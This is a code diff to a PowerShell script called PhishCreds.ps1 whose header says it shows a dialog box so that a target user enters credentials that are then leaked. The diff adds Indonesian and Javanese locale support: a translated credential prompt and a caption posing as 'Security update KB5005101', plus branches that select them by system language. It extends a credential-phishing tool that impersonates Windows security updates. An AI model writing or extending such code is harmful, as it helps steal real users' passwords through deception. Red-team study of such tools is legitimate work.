@@ -13,7 +13,7 @@
    dialogBox in the hope that target user enters is credentials to leak them.
 
 .NOTES
-   Supported languages: pt-PT,en-AU,pt-BZ,pt-BR,en-IE,de-AT,de-FR,eu-ES,nl,nl-BQ
+   Supported languages: pt-PT,en-AU,pt-BZ,pt-BR,en-IE,de-AT,de-FR,eu-ES,nl,nl-BQ,en-ID,id-ID,jv-ID
 
 .EXAMPLE
    PS C:\> .\PhishCreds.ps1
@@ -42,6 +42,7 @@ function Await($WinRtTask, $ResultType)
 
 ## Supported languages
 $message_ho = "Voer gebruikersgegevens in"
+$message_id = "Masukkan kredensial pengguna"
 $message_en = "Please enter user credentials"
 $message_it = "Inserire le credenziali dell'utente"
 $message_ge = "Bitte geben Sie Ihre Anmeldedaten ein"
@@ -52,6 +53,7 @@ $message_fr = "Veuillez saisir les informations d'identification de l'utilisateu
 $TargetArch = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
 $caption_en = "Security update KB5005101 - $TargetArch"
 $caption_ge = "Sicherheitsupdate KB5005101 - $TargetArch"
+$caption_id = "Pembaruan keamanan KB5005101 - $TargetArch"
 $caption_ho = "Beveiligingsupdate KB5005101 - $TargetArch"
 $caption_pt = "Update de segurança KB5005101 - $TargetArch"
 $caption_fr = "Mise à jour de sécurité KB5005101 - $TargetArch"
@@ -95,6 +97,11 @@ ElseIf(($language -match 'nl') -or ($language -match 'nl-BQ'))
 {
    $message = $message_ho
    $caption = $caption_ho
+}
+ElseIf(($language -match 'en-ID') -or ($language -match 'id-ID') -or ($language -match 'jv-ID'))
+{
+   $message = $message_id
+   $caption = $caption_id
 }
 Else
 {
